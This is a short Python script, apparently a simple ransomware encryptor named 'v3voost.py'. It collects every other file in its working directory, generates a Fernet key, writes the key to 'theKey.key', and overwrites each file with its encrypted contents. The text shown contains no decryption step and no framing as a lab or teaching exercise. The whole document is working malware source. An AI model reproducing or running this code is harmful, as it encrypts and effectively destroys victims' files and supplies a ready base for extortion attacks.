#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files


files = []

for file in os.listdir():
       if file == "v3voost.py" or file == "theKey.key":
              continue
       if  os.path.isfile(file):
             files.append(file)


print(files)

key = Fernet.generate_key()

with open("theKey.key", "wb") as theKey:
         theKey.write(key)


for file in files:
         with open(file, "rb") as thefile:
                  contents = thefile.read()
                  contents_encrypted = Fernet(key).encrypt(contents)
                  with open(file, "wb") as thefile:
                    thefile.write(contents_encrypted)